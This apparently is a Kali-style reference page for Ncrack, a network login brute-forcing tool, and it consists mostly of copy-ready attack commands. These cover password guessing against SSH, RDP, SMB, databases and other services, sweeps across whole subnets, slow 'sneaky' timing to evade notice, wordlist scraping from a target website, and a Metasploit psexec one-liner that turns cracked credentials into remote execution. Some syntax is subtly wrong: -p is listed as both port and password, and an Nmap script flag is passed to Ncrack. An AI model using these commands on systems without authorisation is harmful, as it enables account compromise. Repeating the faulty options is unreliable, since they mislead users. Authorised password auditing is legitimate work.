---
title: "Ncrack - High-Speed Network Authentication Cracking"
authors:
  - "Kali Linux Documentation"
date: "2026-07-18"
categories:
  - "Brute Force"
  - "Credential Access"
  - "Network Attacks"
tags:
  - "ncrack"
  - "brute-force"
  - "password-cracking"
  - "network-authentication"
  - "nmap"
mitre_tactic: credential_access
mitre_tactic_id: TA0006
mitre_technique: Brute Force
mitre_technique_id: T1110
version: "0.7"
tool_url: "https://github.com/nmap/ncrack"
kali_url: "https://www.kali.org/tools/ncrack/"
license: "GPL-2.0"
---

# Ncrack - High-Speed Network Authentication Cracking

## Overview

**Ncrack** is a high-speed network authentication cracking tool developed by the Nmap project. It was designed to help companies secure their networks by proactively testing all their hosts and networking devices for poor passwords. Ncrack features a modular approach, command-line syntax similar to Nmap, and a dynamic engine that adapts its behavior based on network feedback.

**Key Features**:
- **Nmap-like syntax** - Familiar interface for Nmap users
- **Dynamic engine** - Adapts behavior based on network feedback
- **Timing templates** - Ease of use with predefined timing profiles
- **Runtime interaction** - Similar to Nmap's interactive mode
- **High-speed performance** - Optimized for large-scale auditing
- **XML output** - Machine-readable output for integration

**Supported Protocols**:
- **Remote Access**: SSH, RDP, Telnet, VNC, Rlogin, Rexec, Rsh
- **Web**: HTTP, HTTPS, WordPress
- **Email**: POP3, POP3S, IMAP, IMAPS
- **Database**: MySQL, MSSQL, PostgreSQL, MongoDB, Cassandra, Redis
- **File Transfer**: FTP, SMB, CVS
- **Directory**: LDAP
- **VoIP**: SIP
- **Other**: MQTT, DICOM, WinRM, OWA

## Installation

### Kali Linux (APT)

```bash
sudo apt install -y ncrack
```

### From Source

```bash
# Install dependencies
sudo apt install -y build-essential libssl-dev

# Clone and build
git clone https://github.com/nmap/ncrack
cd ncrack
./configure
make
sudo make install
```

## Command Reference

### Core Options

| Option | Description |
|--------|-------------|
| `-p PORT` | Specify port(s) to attack |
| `-u USER` | Single username |
| `-U FILE` | Username list file |
| `-p PASS` | Single password |
| `-P FILE` | Password list file |
| `-C FILE` | Colon-separated `user:pass` file |
| `-M FILE` | Target list file |
| `-i DIR` | Input directory for resume |
| `-o DIR` | Output directory for results |
| `-oX FILE` | XML output file |
| `-oN FILE` | Normal output file |
| `-oG FILE` | Grepable output file |
| `-oA FILE` | Output in all formats |
| `-f` | Exit after first found credential per host |
| `-F` | Exit after first found credential (global) |
| `-s` | Skip host after first found credential |
| `-T TEMPLATE` | Timing template: paranoid (0), sneaky (1), polite (2), normal (3), aggressive (4), insane (5) |
| `-v` | Verbose output |
| `-d` | Debug mode |
| `-n` | No DNS resolution |
| `-V` | Show version |
| `-h` | Show help |

### Protocol-Specific Options

```bash
# View protocol-specific options
ncrack -h

# Example: SSH options
ncrack --ssh-help

# Example: RDP options
ncrack --rdp-help
```

## Usage Examples

### SSH Brute Force

**Single User, Password List**:
```bash
ncrack -p 22 --user root -P /usr/share/wordlists/rockyou.txt 192.168.1.100
```

**User List, Password List**:
```bash
ncrack -p 22 --user users.txt -P passwords.txt 192.168.1.100
```

**Custom Port**:
```bash
ncrack -p 2222 --user admin -P passwords.txt 192.168.1.100
```

### RDP Brute Force

```bash
ncrack -p 3389 --user administrator -P passwords.txt 192.168.1.100
```

### FTP Brute Force

```bash
ncrack -p 21 --user admin -P passwords.txt 192.168.1.100
```

### HTTP Brute Force

```bash
ncrack -p 80 --user admin -P passwords.txt 192.168.1.100
```

### MySQL Brute Force

```bash
ncrack -p 3306 --user root -P passwords.txt 192.168.1.100
```

### MSSQL Brute Force

```bash
ncrack -p 1433 --user sa -P passwords.txt 192.168.1.100
```

### SMB Brute Force

```bash
ncrack -p 445 --user administrator -P passwords.txt 192.168.1.100
```

### VNC Brute Force

```bash
ncrack -p 5900 --user "" -P passwords.txt 192.168.1.100
```

### Multiple Targets

**From File**:
```bash
ncrack -p 22 --user root -P passwords.txt -iL targets.txt
```

**CIDR Notation**:
```bash
ncrack -p 22 --user root -P passwords.txt 192.168.1.0/24
```

**Target File with Ports**:
```bash
# targets.txt format:
# 192.168.1.100:22
# 192.168.1.101:3389
# 192.168.1.102:21

ncrack -p 22,3389,21 --user root -P passwords.txt -iL targets.txt
```

### Timing Templates

```bash
# Paranoid (slowest, stealthiest)
ncrack -p 22 --user root -P passwords.txt -T 0 192.168.1.100

# Sneaky
ncrack -p 22 --user root -P passwords.txt -T 1 192.168.1.100

# Polite
ncrack -p 22 --user root -P passwords.txt -T 2 192.168.1.100

# Normal (default)
ncrack -p 22 --user root -P passwords.txt -T 3 192.168.1.100

# Aggressive
ncrack -p 22 --user root -P passwords.txt -T 4 192.168.1.100

# Insane (fastest)
ncrack -p 22 --user root -P passwords.txt -T 5 192.168.1.100
```

### Output Formats

**XML Output**:
```bash
ncrack -p 22 --user root -P passwords.txt -oX results.xml 192.168.1.100
```

**Normal Output**:
```bash
ncrack -p 22 --user root -P passwords.txt -oN results.txt 192.168.1.100
```

**Grepable Output**:
```bash
ncrack -p 22 --user root -P passwords.txt -oG results.grep 192.168.1.100
```

**All Formats**:
```bash
ncrack -p 22 --user root -P passwords.txt -oA results 192.168.1.100
```

### Session Management

**Resume Interrupted Session**:
```bash
ncrack -p 22 --user root -P passwords.txt -i resume/ 192.168.1.100
```

**Save Session**:
```bash
ncrack -p 22 --user root -P passwords.txt -o results/ 192.168.1.100
```

### Stop on First Found

```bash
# Stop after first found per host
ncrack -p 22 --user root -P passwords.txt -f 192.168.1.100

# Stop after first found globally
ncrack -p 22 --user root -P passwords.txt -F 192.168.1.100
```

## Output Interpretation

### Successful Login

```
Discovered credentials for ssh on 192.168.1.100 22/tcp:
192.168.1.100 22/tcp ssh: root password123
```

### XML Output Example

```xml
<ncrackrun login="root" password="password123" port="22/tcp" proto="ssh" host="192.168.1.100"/>
```

### Grepable Output

```
Host: 192.168.1.100 ()  Ports: 22/tcp/open/ssh//ssh//root password123/
```

## Integration with Nmap

### Nmap Scan → Ncrack Attack Workflow

```bash
# 1. Scan for open services with Nmap
nmap -p 22,80,445,3306,3389 --open 192.168.1.0/24 -oA nmap_scan

# 2. Extract targets from Nmap output
grep "open" nmap_scan.gnmap | awk '{print $2, $3}' | sort -u > targets.txt

# 3. Attack discovered services with Ncrack
ncrack -p 22 --user root -P passwords.txt -iL targets.txt
```

### Nmap XML → Ncrack

```bash
# 1. Scan with XML output
nmap -p 22,80,445,3306,3389 --open 192.168.1.0/24 -oX nmap_scan.xml

# 2. Attack with Ncrack
ncrack -p 22 --user root -P passwords.txt --script ssh-auth-methods 192.168.1.100
```

## Integration with Other Tools

### Metasploit Integration

```bash
# After finding credentials with Ncrack
msfconsole -q -x "use exploit/windows/smb/psexec; set RHOSTS 192.168.1.100; set SMBUser admin; set SMBPass password123; exploit"
```

### Hashcat Integration

```bash
# Capture NTLMv2 hash with Responder, then crack with hashcat
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

## Operational Security

### Rate Limiting

```bash
# Use paranoid timing template
ncrack -p 22 --user root -P passwords.txt -T 0 192.168.1.100

# Use polite timing template
ncrack -p 22 --user root -P passwords.txt -T 2 192.168.1.100
```

### Logging

```bash
# Enable verbose output
ncrack -p 22 --user root -P passwords.txt -v 192.168.1.100

# Log to file
ncrack -p 22 --user root -P passwords.txt -oN results.txt 192.168.1.100
```

## Common Issues and Troubleshooting

### Issue: "Connection refused"

**Cause**: Service not running or firewall blocking.

**Solution**:
```bash
# Verify service is running
nmap -p 22 192.168.1.100

# Test connection manually
ssh root@192.168.1.100
```

### Issue: "No credentials found"

**Cause**: Strong passwords or account lockout.

**Solution**:
```bash
# Try different wordlist
ncrack -p 22 --user root -P /usr/share/wordlists/rockyou.txt 192.168.1.100

# Try timing templates
ncrack -p 22 --user root -P passwords.txt -T 0 192.168.1.100
```

### Issue: "Too many connections"

**Cause**: Target limiting connections.

**Solution**:
```bash
# Use polite timing template
ncrack -p 22 --user root -P passwords.txt -T 2 192.168.1.100
```

### Issue: "SSL certificate errors"

**Cause**: Self-signed or invalid SSL certificates.

**Solution**:
```bash
# Try different SSL options
ncrack -p 443 --user admin -P passwords.txt 192.168.1.100
```

## Best Practices

### Wordlist Preparation

```bash
# Use rockyou.txt
cat /usr/share/wordlists/rockyou.txt | head -10000 > top10k.txt

# Create targeted wordlist
cewl -d 2 -m 5 http://target.com -w target_wordlist.txt

# Combine wordlists
cat /usr/share/wordlists/rockyou.txt target_wordlist.txt | sort -u > combined.txt
```

### Parallel Attacks

```bash
# Attack multiple hosts simultaneously
ncrack -p 22 --user root -P passwords.txt 192.168.1.0/24

# Attack multiple services
ncrack -p 22,3389,21 --user root -P passwords.txt 192.168.1.100
```

### Nmap Integration

```bash
# Scan and attack workflow
nmap -p 22,80,445,3306,3389 --open 192.168.1.0/24 -oA scan
ncrack -p 22 --user root -P passwords.txt 192.168.1.0/24
```

## Resources

- **GitHub Repository**: https://github.com/nmap/ncrack
- **Kali Linux Tools**: https://www.kali.org/tools/ncrack/
- **Man Page**: `man ncrack`
- **Developer's Guide**: https://nmap.org/ncrack/devguide.html
- **License**: GPL-2.0

## Related Tools

- **Hydra**: More protocol support, faster for standard protocols
- **Medusa**: Modular design, good for parallel testing
- **Patator**: Advanced features, more flexible but complex
- **Crowbar**: Specialized for SSH keys, OpenVPN, VNC
